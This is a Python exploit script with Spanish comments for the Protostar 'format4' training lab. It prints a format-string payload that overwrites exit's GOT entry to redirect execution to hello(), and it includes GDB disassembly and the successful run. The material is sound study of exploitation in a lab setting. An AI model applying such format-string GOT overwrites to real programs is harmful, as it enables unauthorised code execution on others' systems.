import sys

sys.stdout.write("\x24\x97\x04\x08%134513840x%4$n")

'''
GDB:
    (gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   %ebp
0x080484d3 <vuln+1>:	mov    %esp,%ebp
0x080484d5 <vuln+3>:	sub    $0x218,%esp
0x080484db <vuln+9>:	mov    0x8049730,%eax
0x080484e0 <vuln+14>:	mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:	movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:	lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:	mov    %eax,(%esp)
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:	mov    %eax,(%esp)
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	movl   $0x1,(%esp)
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
End of assembler dump.
(gdb) disassemble 0x80483ec
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:	jmp    *0x8049724
0x080483f2 <exit@plt+6>:	push   $0x30
0x080483f7 <exit@plt+11>:	jmp    0x804837c
End of assembler dump.
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2

                        POC
Con el argumento 4 nos encontramos nuestra variable.
Solo necesitamos un padding igual al numero de bytes que queremos escribir en la GOT de exit y saltar a la funcion hello(). Por supuesto los primeros 4 bytes son los bytes correspondientes a la direccion de memoria de la GOT de exit().
El padding despues de los 4 bytes son el numero de bytes en decimal del valor en hexadecimal de la direccion de memoria de la funcion hello() - 4.

EXPLOITATION:
user@protostar:/tmp$ python exploit_format4.py > out
user@protostar:/tmp$ ./format4 < out
.....................................
200code execution redirected! you win

'''
